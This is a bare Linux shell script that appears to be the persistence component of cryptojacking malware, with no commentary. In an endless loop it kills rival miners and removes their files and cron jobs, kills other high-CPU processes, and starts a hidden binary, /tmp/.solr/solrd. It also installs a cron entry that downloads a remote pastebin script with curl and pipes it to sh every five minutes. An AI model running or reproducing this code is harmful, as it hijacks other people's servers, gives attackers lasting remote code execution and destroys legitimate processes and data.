#!/bin/sh
export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
while [ 1 ]
do
    killall -9 /tmp/.sysinfo/*
    rm -f /tmp/.sysinfo/*
    chattr +i /tmp/.sysinfo
    killall /tmp/*
    killall /var/tmp/*
    crontab -l | sed '/.sh/d' | crontab -
    crontab -l | sed '/xms/d' | crontab -
    crontab -l | sed '/echo/d' | crontab -
    crontab -l | grep -e "zaVxfEYS" | grep -v grep
    if [ $? -eq 0 ]; then
      echo "cron good"
    else
      (
        crontab -l 2>/dev/null
        echo "*/5 * * * * curl -fsSL https://pastebin.com/raw/zaVxfEYS | sh"
      ) | crontab -
    fi
    rm -f /tmp/*.sh
    rm -f /var/spool/cron/backup.db
    rm -f /var/spool/cron/dump.rdb
    rm -f /var/spool/cron/jw
    rm -f /var/spool/cron/uo
    rm -f /tmp/jenkins
    ps aux | grep -v grep | grep '4444' | awk '{print $2}' | xargs -I % kill -9 %
    ps -ef | grep /tmp/ | grep -v 'java\|redis\|mongod\|grep\|weblogic\|solr\|oracle'| cut -c 9-15 | xargs kill -9
    ps aux | grep -v grep | grep 'givemexyz' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'dbuse' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'x64b' | awk '{print $2}' | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
    pgrep JavaUpdate | xargs -I % kill -9 %
    pgrep kinsing | xargs -I % kill -9 %
    pgrep network | xargs -I % kill -9 %
    pgrep donate | xargs -I % kill -9 %
    pgrep kdevtmpfsi | xargs -I % kill -9 %
    pgrep crun | xargs -I % kill -9 %
    pgrep trace | xargs -I % kill -9 %
    pgrep sysupdate | xargs -I % kill -9 %
    pgrep mysqlserver | xargs -I % kill -9 %
    ps aux | grep -v grep | grep 'trace' | awk '{print $2}' | xargs -I % kill -9 %
    rm -f /var/spool/cron/crontabs/dump.rdb
    killall -9 kworkerds
    chattr -i /etc/cron.d/apache
    chattr -i /etc/cron.d/0hourly
    rm -f /etc/cron.d/apache
    rm -f /etc/cron.d/0hourly
    rm -f /tmp/kworkerds
    rm -rf ~/c3pool/*
    rm -f /var/tmp/kworkerds
    rm -f /etc/cron.hourly/oanacroner
    rm -f /etc/cron.hourly/oanacrona
    rm -f /etc/cron.daily/oanacroner
    rm -f /etc/cron.daily/oanacrona
    rm -f /etc/cron.monthly/oanacroner
    rm -f /usr/local/bin/dns
    pkill .systemcero
    pkill vTtHH
    pkill xmrig
    pkill miner.sh
    pkill -f /tmp/just4root
    pkill -f /tmp/just4copy
    pkill -f /tmp/dc_name
    pkill x7
    pkill cloudupdate
    pkill diskmanagerd
    pkill jspserv
    pkill init
    pkill sysupdate
    pkill sysguard
    pkill networkservice
    pkill kdevtmpfs
    pkill watchbog
    rm -f /usr/share/watchbog/watchbog
    rm -f /bin/httpsntp
    rm -f /bin/ftpsntp
    rm -f /tmp/.systemcero
    rm -f /tmp/vTtHH
    rm -f /usr/bin/.systemcero
    rm -f /usr/bin/cloudupdate
    rm -f /usr/bin/diskmanagerd
    rm -f /lib/libterminfo.so
    rm -f /tmp/config.json
    rm -f /var/tmp/jspserv
    rm -f /etc/update.sh
    chattr -i /etc/sysupdate
    rm -f /etc/sysupdate
    rm -f /etc/config.json
    p=$(ps auxf|grep solrd|awk '{if($3>=60.0) print $2}')
    name=""$p
    if [ -z "$name" ]
    then
        pkill solrd
        ps aux | grep -v grep | grep -v 'java\|redis\|weblogic\|solr\|mongod\|mysql\|oracle\|tomcat\|grep\|postgres\|confluence\|awk\|aux\|sh' | awk '{if($3>60.0) print $2}' | xargs -I % kill -9 %
        nohup /tmp/.solr/solrd &>>/dev/null &
        sleep 30
    else
         :
    fi
    sleep 1
done
